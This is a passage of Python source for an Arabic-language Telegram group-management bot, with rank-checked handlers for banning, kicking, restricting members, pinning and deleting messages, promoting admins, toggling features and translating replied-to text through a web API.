        else:
            if not r.get(f"{m.chat.id}:disableShazam:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} شازام مفعل من قبل\n☆"
                )
            else:
                r.delete(f"{m.chat.id}:disableShazam:{Dev_Zaid}")
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر فعلت شازام\n☆"
                )

    if text == "تعطيل الالعاب":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:disableGames:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} الالعاب معطله من قبل\n☆"
                )
            else:
                r.set(f"{m.chat.id}:disableGames:{Dev_Zaid}", 1)
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر عطلت الالعاب\n☆"
                )

    if text == "تفعيل الالعاب":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:disableGames:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} الالعاب مفعله من قبل\n☆"
                )
            else:
                r.delete(f"{m.chat.id}:disableGames:{Dev_Zaid}")
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر فعلت الالعاب\n☆"
                )

    if text == "تعطيل الترجمة" or text == "تعطيل الترجمه":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:disableTrans:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} الترجمه معطله من قبل\n☆"
                )
            else:
                r.set(f"{m.chat.id}:disableTrans:{Dev_Zaid}", 1)
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر عطلت الترجمه\n☆"
                )

    if text == "تفعيل الترجمة" or text == "تفعيل الترجمه":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:disableTrans:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} الترجمه مفعله من قبل\n☆"
                )
            else:
                r.delete(f"{m.chat.id}:disableTrans:{Dev_Zaid}")
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر فعلت الترجمه\n☆"
                )

    if text == "تعطيل التسلية" or text == "تعطيل التسليه":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:disableFun:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} التسلية معطله من قبل\n☆"
                )
            else:
                r.set(f"{m.chat.id}:disableFun:{Dev_Zaid}", 1)
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر عطلت التسلية\n☆"
                )

    if text == "تفعيل التسلية" or text == "تفعيل التسليه":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:disableFun:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} التسلية مفعله من قبل\n☆"
                )
            else:
                r.delete(f"{m.chat.id}:disableFun:{Dev_Zaid}")
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر فعلت التسلية\n☆"
                )

    if text == "تعطيل الاشتراك":
        if not dev2_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المطور وفوق ) بس")
        else:
            if r.get(f"disableSubscribe:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} الاشتراك الاجباري معطل من قبل\n☆"
                )
            else:
                r.set(f"disableSubscribe:{Dev_Zaid}", 1)
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر عطلت الاشتراك الاجباري\n☆"
                )

    if text == "قناة الاشتراك":
        if not dev2_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المطور وفوق ) بس")
        ch = r.get(f"forceChannel:{Dev_Zaid}") or "مافي قناة"
        return m.reply(f"{k} قناة الاشتراك هي ( {ch} )")

    if text.startswith("وضع قناة @"):
        if not dev2_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المطور وفوق ) بس")
        username = text.split("@")[1]
        try:
            chat = c.get_chat(username)
        except:
            return m.reply(f"{k} حدث خطأ")
        r.set(f"forceChannel:{Dev_Zaid}", "@" + username)
        return m.reply(f"{k} تم تعيين القناة بنجاح")

    if text == "تفعيل الاشتراك":
        if not dev2_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المطور وفوق ) بس")
        else:
            if not r.get(f"disableSubscribe:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} الاشتراك الاجباري مفعل من قبل\n☆"
                )
            else:
                r.delete(f"disableSubscribe:{Dev_Zaid}")
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر فعلت الاشتراك الاجباري\n☆"
                )

    if (
        text == "/ar"
        and m.reply_to_message
        and (m.reply_to_message.text or m.reply_to_message.caption)
    ):
        if not r.get(f"{m.chat.id}:disableTrans:{Dev_Zaid}"):
            text = m.reply_to_message.text or m.reply_to_message.caption
            translation = requests.get(
                f"https://hozory.com/translate/?target=ar&text={text}"
            ).json()["result"]["translate"]
            m.reply(f"`{translation}`")

    if (
        text == "/en"
        and m.reply_to_message
        and (m.reply_to_message.text or m.reply_to_message.caption)
    ):
        if not r.get(f"{m.chat.id}:disableTrans:{Dev_Zaid}"):
            text = m.reply_to_message.text or m.reply_to_message.caption
            translation = requests.get(
                f"https://hozory.com/translate/?target=en&text={text}"
            ).json()["result"]["translate"]
            m.reply(f"`{translation}`")

    if (
        text == "ترجمه"
        and m.reply_to_message
        and (m.reply_to_message.text or m.reply_to_message.caption)
    ):
        if not r.get(f"{m.chat.id}:disableTrans:{Dev_Zaid}"):
            text = m.reply_to_message.text or m.reply_to_message.caption
            en = requests.get(
                f"https://hozory.com/translate/?target=en&text={text}"
            ).json()["result"]["translate"]
            ar = requests.get(
                f"https://hozory.com/translate/?target=ar&text={text}"
            ).json()["result"]["translate"]
            ru = requests.get(
                f"https://hozory.com/translate/?target=ru&text={text}"
            ).json()["result"]["translate"]
            zh = requests.get(
                f"https://hozory.com/translate/?target=zh&text={text}"
            ).json()["result"]["translate"]
            fr = requests.get(
                f"https://hozory.com/translate/?target=fr&text={text}"
            ).json()["result"]["translate"]
            du = requests.get(
                f"https://hozory.com/translate/?target=nl&text={text}"
            ).json()["result"]["translate"]
            tr = requests.get(
                f"https://hozory.com/translate/?target=tr&text={text}"
            ).json()["result"]["translate"]
            txt = f"🇷🇺 : \n {ru}\n\n🇨🇳 : \n {zh}\n\n🇫🇷 :\n {fr}\n\n🇩🇪 :\n {du}\n\n🇹🇷 : \n{tr}"
            return m.reply(txt)

    if (
        text.startswith("ترجمه ")
        and m.reply_to_message
        and (m.reply_to_message.text or m.reply_to_message.caption)
    ):
        if not r.get(f"{m.chat.id}:disableTrans:{Dev_Zaid}"):
            lang = text.split()[1]
            text = m.reply_to_message.text or m.reply_to_message.caption
            translation = requests.get(
                f"https://hozory.com/translate/?target={lang}&text={text}"
            ).json()["result"]["translate"]
            m.reply(f"`{translation}`")

    if text == "ابلاغ" and m.reply_to_message:
        text = f"{k} تم ابلاغ المشرفين"
        cc = 0
        for mm in c.get_chat_members(
            m.chat.id, filter=ChatMembersFilter.ADMINISTRATORS
        ):
            if not mm.user.is_deleted and not mm.user.is_bot:
                cc += 1
                text += f"[⁪⁬⁪⁬⁮⁪⁬⁪⁬⁮](tg://user?id={mm.user.id})"
        if cc == 0:
            return False
        return m.reply(
            text,
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("⚠️", callback_data="delAdminMSG")]]
            ),
        )

    if text == "المقيدين":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( المدير وفوق ) بس")
        else:
            co = 0
            cc = 1
            text = "المقيدين:\n\n"
            for mm in c.get_chat_members(
                m.chat.id, filter=ChatMembersFilter.RESTRICTED
            ):
                if co == 100:
                    break
                if not mm.user.is_deleted:
                    co += 1
                    user = (
                        f"@{mm.user.username}"
                        if mm.user.username
                        else f"[@{channel}](tg://user?id={mm.user.id})"
                    )
                    text += f"{cc} ➣ {user} ☆ ( `{mm.user.id}` )\n"
                    cc += 1
            text += "☆"
            if co == 0:
                return m.reply(f"{k} مافيه مقيديين")
            else:
                return m.reply(text)

    if text == "مسح المقيدين":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( المدير وفوق ) بس")
        else:
            co = 0
            for mm in c.get_chat_members(
                m.chat.id, filter=ChatMembersFilter.RESTRICTED
            ):
                co += 1
                c.restrict_chat_member(
                    m.chat.id,
                    mm.user.id,
                    ChatPermissions(
                        can_send_messages=True,
                        can_send_media_messages=True,
                        can_send_other_messages=True,
                        can_send_polls=True,
                        can_invite_users=True,
                        can_add_web_page_previews=True,
                        can_change_info=True,
                        can_pin_messages=True,
                    ),
                )
            if co == 0:
                return m.reply(f"{k} مافيه مقيديين")
            else:
                return m.reply(f"{k} ابشر مسحت ( {co} ) من المقيدين")

    if text == "تثبيت" and m.reply_to_message:
        if mod_pls(m.from_user.id, m.chat.id):
            m.reply_to_message.pin(disable_notification=False)
            m.reply(f"{k} ابشر ثبتت الرسالة ")

    if text == "الغاء التثبيت" and m.reply_to_message:
        if mod_pls(m.from_user.id, m.chat.id):
            m.reply_to_message.unpin()
            m.reply(f"{k} ابشر لغيت تثبيت الرسالة ")

    if text.startswith("تقييد ") and len(text.split()) == 2:
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( المدير وفوق ) بس")
        else:
            try:
                user = int(text.split()[1])
            except:
                user = text.split()[1].replace("@", "")
            try:
                get = m.chat.get_member(user)
                if m.from_user.id == get.user.id:
                    return m.reply("شفيك تبي تنزل نفسك")
                if pre_pls(get.user.id, m.chat.id):
                    rank = get_rank(get.user.id, m.chat.id)
                    return m.reply(f"{k} هييه مايمديك تقييد {rank} ياورع!")
                if get.status == ChatMemberStatus.RESTRICTED:
                    return m.reply(f"「 {get.user.mention} 」 \n{k} مقيد من قبل\n☆")
            except:
                return m.reply(f"{k} مافي عضو بهذا اليوزر")
            c.restrict_chat_member(
                m.chat.id, get.user.id, ChatPermissions(can_send_messages=False)
            )
            return m.reply(f"「 {get.user.mention} 」 \n{k} قييدته\n☆")

    if text == "تقييد" and m.reply_to_message and m.reply_to_message.from_user:
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( المدير وفوق ) بس")
        else:
            if m.from_user.id == m.reply_to_message.from_user.id:
                return m.reply("شفيك تبي تنزل نفسك")
            get = m.chat.get_member(m.reply_to_message.from_user.id)
            if pre_pls(m.reply_to_message.from_user.id, m.chat.id):
                rank = get_rank(m.reply_to_message.from_user.id, m.chat.id)
                return m.reply(f"{k} هييه مايمديك تقييد {rank} ياورع!")
            if get.status == ChatMemberStatus.RESTRICTED:
                return m.reply(
                    f"「 {m.reply_to_message.from_user.mention} 」 \n{k} مقيد من قبل\n☆"
                )
            c.restrict_chat_member(
                m.chat.id,
                m.reply_to_message.from_user.id,
                ChatPermissions(can_send_messages=False),
            )
            return m.reply(
                f"「 {m.reply_to_message.from_user.mention} 」 \n{k} قييدته\n☆"
            )

    if (
        text.startswith("الغاء تقييد ")
        or text.startswith("الغاء التقييد ")
        and len(text.split()) == 3
    ):
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( الادمن وفوق ) بس")
        else:
            try:
                user = int(text.split()[2])
            except:
                user = text.split()[2].replace("@", "")
            try:
                get = m.chat.get_member(user)
                if not get.status == ChatMemberStatus.RESTRICTED:
                    return m.reply(f"「 {get.user.mention} 」 \n{k} مو مقيد من قبل\n☆")
            except:
                return m.reply(f"{k} مافي عضو بهذا اليوزر")
            c.restrict_chat_member(
                m.chat.id,
                get.user.id,
                ChatPermissions(
                    can_send_messages=True,
                    can_send_media_messages=True,
                    can_send_other_messages=True,
                    can_send_polls=True,
                    can_invite_users=True,
                    can_add_web_page_previews=True,
                    can_change_info=True,
                    can_pin_messages=True,
                ),
            )
            return m.reply(f"「 {get.user.mention} 」 \n{k} ابشر الغيت تقييده\n☆")

    if (
        text == "الغاء تقييد"
        or text == "الغاء التقييد"
        and m.reply_to_message
        and m.reply_to_message.from_user
    ):
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( الادمن وفوق ) بس")
        else:
            get = m.chat.get_member(m.reply_to_message.from_user.id)
            if not get.status == ChatMemberStatus.RESTRICTED:
                return m.reply(
                    f"「 {m.reply_to_message.from_user.mention} 」 \n{k} مو مقيد من قبل\n☆"
                )
            c.restrict_chat_member(
                m.chat.id,
                m.reply_to_message.from_user.id,
                ChatPermissions(
                    can_send_messages=True,
                    can_send_media_messages=True,
                    can_send_other_messages=True,
                    can_send_polls=True,
                    can_invite_users=True,
                    can_add_web_page_previews=True,
                    can_change_info=True,
                    can_pin_messages=True,
                ),
            )
            return m.reply(
                f"「 {m.reply_to_message.from_user.mention} 」 \n{k} ابشر الغيت تقييده\n☆"
            )

    if text == "المحظورين":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( المدير وفوق ) بس")
        else:
            co = 0
            cc = 1
            text = "المحظورين:\n\n"
            for mm in c.get_chat_members(m.chat.id, filter=ChatMembersFilter.BANNED):
                if co == 100:
                    break
                if mm.user:
                    if not mm.user.is_deleted:
                        co += 1
                        user = (
                            f"@{mm.user.username}"
                            if mm.user.username
                            else f"[@{channel}](tg://user?id={mm.user.id})"
                        )
                        text += f"{cc} ➣ {user} ☆ ( `{mm.user.id}` )\n"
                        cc += 1
                if mm.chat:
                    co += 1
                    user = f"@{mm.chat.username}"
                    text += f"{cc} ➣ {user} ☆ (`{mm.chat.id}`)\n"
                    cc += 1
            text += "☆"
            if co == 0:
                return m.reply(f"{k} مافيه محظورين")
            else:
                return m.reply(text)

    if text == "مسح المحظورين":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( الادمن وفوق ) بس")
        else:
            co = 0
            for mm in c.get_chat_members(m.chat.id, filter=ChatMembersFilter.BANNED):
                if mm.user:
                    co += 1
                    c.unban_chat_member(m.chat.id, mm.user.id)
                if mm.chat:
                    co += 1
                    c.unban_chat_member(m.chat.id, mm.chat.id)
            if co == 0:
                return m.reply(f"{k} مافيه محظورين")
            else:
                return m.reply(f"{k} ابشر مسحت ( {co} ) من المحظورين")

    if text.startswith("حظر ") and len(text.split()) == 2:
        if not "@" in text and not re.findall("[0-9]+", text):
            return
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( المدير وفوق ) بس")
        else:
            try:
                user = int(text.split()[1])
            except:
                user = text.split()[1].replace("@", "")
            try:
                get = m.chat.get_member(user)
                if m.from_user.id == get.user.id:
                    return m.reply("شفيك تبي تنزل نفسك")
                if pre_pls(get.user.id, m.chat.id):
                    rank = get_rank(get.user.id, m.chat.id)
                    return m.reply(f"{k} هييه مايمديك تحظر {rank} ياورع!")
                if get.status == ChatMemberStatus.BANNED:
                    return m.reply(f"「 {get.user.mention} 」 \n{k} محظور من قبل\n☆")
            except:
                return m.reply(f"{k} مافي عضو بهذا اليوزر")
            m.chat.ban_member(get.user.id)
            return m.reply(f"「 {get.user.mention} 」 \n{k} حظرته\n☆")

    if text == "حظر" and m.reply_to_message and m.reply_to_message.from_user:
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( المدير وفوق ) بس")
        else:
            if m.from_user.id == m.reply_to_message.from_user.id:
                return m.reply("شفيك تبي تنزل نفسك")
            get = m.chat.get_member(m.reply_to_message.from_user.id)
            if pre_pls(m.reply_to_message.from_user.id, m.chat.id):
                rank = get_rank(m.reply_to_message.from_user.id, m.chat.id)
                return m.reply(f"{k} هييه مايمديك تحظر {rank} ياورع!")
            if get.status == ChatMemberStatus.BANNED:
                return m.reply(
                    f"「 {m.reply_to_message.from_user.mention} 」 \n{k} محظور من قبل\n☆"
                )
            m.chat.ban_member(m.reply_to_message.from_user.id)
            return m.reply(
                f"「 {m.reply_to_message.from_user.mention} 」 \n{k} حظرته\n☆"
            )

    if text == "طرد البوتات":
        if not owner_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( المالك وفوق ) بس")
        else:
            co = 0
            for mm in m.chat.get_members(filter=ChatMembersFilter.BOTS):
                try:
                    m.chat.ban_member(mm.user.id)
                    co += 1
                except:
                    pass
            if co == 0:
                return m.reply(f"{k} مافيه بوتات")
            else:
                return m.reply(f"{k} ابشر حظر ( {co} ) بوت")

    if text.startswith("طرد ") and len(text.split()) == 2:
        if not "@" in text and not re.findall("[0-9]+", text):
            return
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( الادمن وفوق ) بس")
        else:
            try:
                user = int(text.split()[1])
            except:
                user = text.split()[1].replace("@", "")
            try:
                get = m.chat.get_member(user)
                if m.from_user.id == get.user.id:
                    return m.reply("شفيك تبي تنزل نفسك")
                if pre_pls(get.user.id, m.chat.id):
                    rank = get_rank(get.user.id, m.chat.id)
                    return m.reply(f"{k} هييه مايمديك تطرد {rank} ياورع!")
                if get.status == ChatMemberStatus.BANNED:
                    return m.reply(f"「 {get.user.mention} 」 \n{k} مطرود من قبل\n☆")
            except:
                return m.reply(f"{k} مافي عضو بهذا اليوزر")
            m.chat.ban_member(get.user.id)
            m.chat.unban_member(get.user.id)
            return m.reply(f"「 {get.user.mention} 」 \n{k} طردته\n☆")

    if text == "اهمس" and m.reply_to_message and m.reply_to_message.from_user:
        if r.get(f"{m.chat.id}:disableWHISPER:{Dev_Zaid}"):
            return m.reply(f"{k} امر اهمس معطل")
        user_id = m.reply_to_message.from_user.id
        if user_id == m.from_user.id:
            return m.reply(f"{k} مافيك تهمس لنفسك ياغبي")
        else:

            id = str(uuid.uuid4())[:6]
            a = m.reply(
                f"{k} تم تحديد الهمسة الى [ {m.reply_to_message.from_user.mention} ]",
                reply_markup=InlineKeyboardMarkup(
                    [
                        [
                            InlineKeyboardButton(
                                f"اهمس الى [ {m.reply_to_message.from_user.first_name[:25]} ]",
                                url=f"t.me/{c.me.username}?start=hmsa{id}",
                            )
                        ]
                    ]
                ),
            )
            data = {
                "from": m.from_user.id,
                "to": user_id,
                "chat": m.chat.id,
                "id": a.id,
            }
            # wsdb.set(str(id), data)
            wsdb.setex(key=id, ttl=3600, value=data)
            return True

    if text == "تعطيل التنظيف":
        if not gowner_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( المالك الاساسي وفوق ) بس")
        else:
            if not r.hget(Dev_Zaid + str(m.chat.id), "ena-clean"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} التنظيف معطل من قبل\n☆"
                )
            else:
                r.hdel(Dev_Zaid + str(m.chat.id), "ena-clean")
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر عطلت التنظيف\n☆"
                )

    if text == "تفعيل التنظيف":
        if not gowner_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( المالك الاساسي وفوق ) بس")
        else:
            if r.hget(Dev_Zaid + str(m.chat.id), "ena-clean"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} التنظيف مفعل من قبل\n☆"
                )
            else:
                r.hset(Dev_Zaid + str(m.chat.id), "ena-clean", 1)
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر فعلت التنظيف\n☆"
                )

    if re.search("^وضع وقت التنظيف [0-9]+$", text):
        if not gowner_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( المالك الاساسي وفوق ) بس")
        else:
            secs = int(text.split()[3])
            if secs > 3600 or secs < 60:
                return m.reply(
                    f"{k} عليك تحديد وقت التنظيف بالثواني من 60 الى 3600 ثانية"
                )
            else:
                r.hset(Dev_Zaid + str(m.chat.id), "clean-secs", secs)
                return m.reply(f"{k} تم تعيين وقت التنظيف ( {secs} ) ثانية")

    if text == "وقت التنظيف":
        if not gowner_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( المالك الاساسي وفوق ) بس")
        else:
            secs = r.hget(Dev_Zaid + str(m.chat.id), "clean-secs") or "60"
            return m.reply(f"`{secs}`")

    if text == "طرد" and m.reply_to_message and m.reply_to_message.from_user:
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( المدير وفوق ) بس")
        else:
            try:
                if m.from_user.id == m.reply_to_message.from_user.id:
                    return m.reply("شفيك تبي تنزل نفسك")
                get = m.chat.get_member(m.reply_to_message.from_user.id)
                if pre_pls(m.reply_to_message.from_user.id, m.chat.id):
                    rank = get_rank(m.reply_to_message.from_user.id, m.chat.id)
                    return m.reply(f"{k} هييه مايمديك تطرد {rank} ياورع!")
                if get.status == ChatMemberStatus.BANNED:
                    return m.reply(
                        f"「 {m.reply_to_message.from_user.mention} 」 \n{k} مطرود من قبل\n☆"
                    )
                m.chat.ban_member(m.reply_to_message.from_user.id)
                m.reply(f"「 {m.reply_to_message.from_user.mention} 」 \n{k} طردته\n☆")
                return m.chat.unban_member(m.reply_to_message.from_user.id)
            except:
                return m.reply(f"{k} العضو مو بالمجموعة")

    if (
        text.startswith("رفع الحظر ")
        or text.startswith("الغاء الحظر ")
        and len(text.split()) == 3
    ):
        if not "@" in text and not re.findall("[0-9]+", text):
            return
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( المدير وفوق ) بس")
        else:
            try:
                user = int(text.split()[2])
            except:
                user = text.split()[2].replace("@", "")
            try:
                get = m.chat.get_member(user)
                if not get.status == ChatMemberStatus.BANNED:
                    return m.reply(f"「 {get.user.mention} 」 \n{k} مو محظور من قبل\n☆")
            except:
                return m.reply(f"{k} مافي عضو بهذا اليوزر")
            m.chat.unban_member(get.user.id)
            return m.reply(f"「 {get.user.mention} 」 \n{k} ابشر الغيت حظره\n☆")

    if (
        text == "رفع الحظر"
        or text == "الغاء الحظر"
        and m.reply_to_message
        and m.reply_to_message.from_user
    ):
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( المدير وفوق ) بس")
        else:
            try:
                get = m.chat.get_member(m.reply_to_message.from_user.id)
                if not get.status == ChatMemberStatus.BANNED:
                    return m.reply(
                        f"「 {m.reply_to_message.from_user.mention} 」 \n{k} مو محظور من قبل\n☆"
                    )
                m.chat.unban_member(m.reply_to_message.from_user.id)
                return m.reply(
                    f"「 {m.reply_to_message.from_user.mention} 」 \n{k} ابشر الغيت حظره\n☆"
                )
            except:
                return m.reply(f"{k} العضو مو بالمجموعة")

    if text.startswith("رفع القيود ") and len(text.split()) == 3:
        if not "@" in text and not re.findall("[0-9]+", text):
            return
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( المدير وفوق ) بس")
        else:
            try:
                user = int(text.split()[2])
            except:
                user = text.split()[2].replace("@", "")
            co = 0
            text = ""
            try:
                get = m.chat.get_member(user)
                if get.status == ChatMemberStatus.BANNED:
                    m.chat.unban_member(get.user.id)
                    text += "حظر\n"
                    co += 1
                if get.status == ChatMemberStatus.RESTRICTED:
                    c.restrict_chat_member(
                        m.chat.id,
                        get.user.id,
                        ChatPermissions(
                            can_send_messages=True,
                            can_send_media_messages=True,
                            can_send_other_messages=True,
                            can_send_polls=True,
                            can_invite_users=True,
                            can_add_web_page_previews=True,
                            can_change_info=True,
                            can_pin_messages=True,
                        ),
                    )
                    text += "تقييد\n"
                    co += 1
                if r.get(f"{get.user.id}:mute:{m.chat.id}{Dev_Zaid}"):
                    r.delete(f"{get.user.id}:mute:{m.chat.id}{Dev_Zaid}")
                    r.srem(f"{m.chat.id}:listMUTE:{Dev_Zaid}", get.user.id)
                    text += "كتم\n"
                    co += 1
                if co > 0:
                    return m.reply(f"رفعت القيود التالية:\n{text}\n☆")
                else:
                    return m.reply(f"「 {get.user.mention} 」\n{k} ماله قيود من قبل\n☆")

            except:
                return m.reply(f"{k} مافي عضو بهذا اليوزر")
            m.chat.unban_member(get.user.id)
            return m.reply(f"「 {get.user.mention} 」 \n{k} ابشر الغيت حظره\n☆")

    if text == "رفع القيود" and m.reply_to_message and m.reply_to_message.from_user:
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( المدير وفوق ) بس")
        else:
            try:
                text = ""
                co = 0
                get = m.chat.get_member(m.reply_to_message.from_user.id)
                if get.status == ChatMemberStatus.BANNED:
                    m.chat.unban_member(get.user.id)
                    text += "حظر\n"
                    co += 1
                if get.status == ChatMemberStatus.RESTRICTED:
                    c.restrict_chat_member(
                        m.chat.id,
                        get.user.id,
                        ChatPermissions(
                            can_send_messages=True,
                            can_send_media_messages=True,
                            can_send_other_messages=True,
                            can_send_polls=True,
                            can_invite_users=True,
                            can_add_web_page_previews=True,
                            can_change_info=True,
                            can_pin_messages=True,
                        ),
                    )
                    text += "تقييد\n"
                    co += 1
                if r.get(f"{get.user.id}:mute:{m.chat.id}{Dev_Zaid}"):
                    r.delete(f"{get.user.id}:mute:{m.chat.id}{Dev_Zaid}")
                    r.srem(f"{m.chat.id}:listMUTE:{Dev_Zaid}", get.user.id)
                    text += "كتم\n"
                    co += 1
                if co > 0:
                    return m.reply(f"رفعت القيود التالية:\n{text}\n☆")
                else:
                    return m.reply(f"「 {get.user.mention} 」\n{k} ماله قيود من قبل\n☆")
            except:
                return m.reply(f"{k} العضو مو بالمجموعة")

    if text == "كشف البوتات":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( المدير وفوق ) بس")
        else:
            co = 0
            text = "بوتات المجموعة:\n\n"
            cc = 1
            for mm in m.chat.get_members(filter=ChatMembersFilter.BOTS):
                if co == 100:
                    break
                text += f"{cc}) {mm.user.mention}"
                if mm.status == ChatMemberStatus.ADMINISTRATOR:
                    text += "👑"
                text += "\n"
                cc += 1
                co += 1
            text += "☆"
            if co == 0:
                return m.reply(f"{k} مافيه بوتات")
            else:
                return m.reply(text)

    if text == "مين ضافني":
        get = m.chat.get_member(m.from_user.id).invited_by
        if not get:
            return m.reply(f"{k} محد ضافك")
        else:
            return m.reply(get.mention)

    if text == "بايو عشوائي":
        return m.reply(f"{k} تحت الصيانة")

    if text == "مسح" and m.reply_to_message:
        if admin_pls(m.from_user.id, m.chat.id):
            m.reply_to_message.delete()
            m.delete()
        else:
            m.delete()

    if (
        text.startswith("مسح ")
        and len(text.split()) == 2
        and re.findall("[0-9]+", text)
    ):
        count = int(re.findall("[0-9]+", text)[0])
        if not admin_pls(m.from_user.id, m.chat.id):
            return m.delete()
        else:
            if count > 400:
                return m.reply(f"{k} اختار من 1 الى 400")
            else:
                for msg in range(m.id, m.id - count, -1):
                    try:
                        c.delete_messages(m.chat.id, msg)
                    except:
                        pass

    if text == "تنزيل مشرف" and m.reply_to_message and m.reply_to_message.from_user:
        if not owner_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( المالك وفوق ) بس")
        else:
            try:
                c.promote_chat_member(
                    m.chat.id,
                    m.reply_to_message.from_user.id,
                    privileges=ChatPrivileges(
                        can_manage_chat=False,
                        can_delete_messages=False,
                        can_manage_video_chats=False,
                        can_restrict_members=False,
                        can_promote_members=False,
                        can_pin_messages=False,
                        can_change_info=False,
                        can_invite_users=False,
                    ),
                )
                return m.reply(
                    f"「 {m.reply_to_message.from_user.mention} 」\n{k} نزلته من الاشراف"
                )
            except:
                return m.reply(
                    f"「 {m.reply_to_message.from_user.mention} 」\n{k} مو انا الي رفعته او ماعندي صلاحيات"
                )

    if text == "رفع مشرف" and m.reply_to_message and m.reply_to_message.from_user:
        if not owner_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الأمر يخص ( المالك وفوق ) بس")
        else:
            get = m.chat.get_member(c.me.id)
            priv = get.privileges
            if (
                not priv.can_manage_chat
                or not priv.can_delete_messages
                or not priv.can_restrict_members
                or not priv.can_pin_messages
                or not priv.can_invite_users
                or not priv.can_change_info
                or not priv.can_promote_members
            ):
                return m.reply("هات كل الصلاحيات بعدين سولف")
            else:
                r.set(
                    f"{m.from_user.id}:promote:{m.chat.id}",
                    m.reply_to_message.from_user.id,
                    ex=600,
                )
                return m.reply(
                    """
⇜ تمام الحين ارسل صلاحيات المشرف

* ⇠ لرفع كل الصلاحيات ما عدا رفع المشرفين
** ⇠ لرفع كل الصلاحيات مع رفع المشرفين

⇜ يمديك تختار الصلاحيات وتعيين لقب للمشرف في سطر واحد

مثال: ** الهطف
☆""",
                    reply_markup=ForceReply(selective=True),
                    parse_mode=ParseMode.HTML,
                )

    if r.get(f"{m.from_user.id}:promote:{m.chat.id}") and owner_pls(
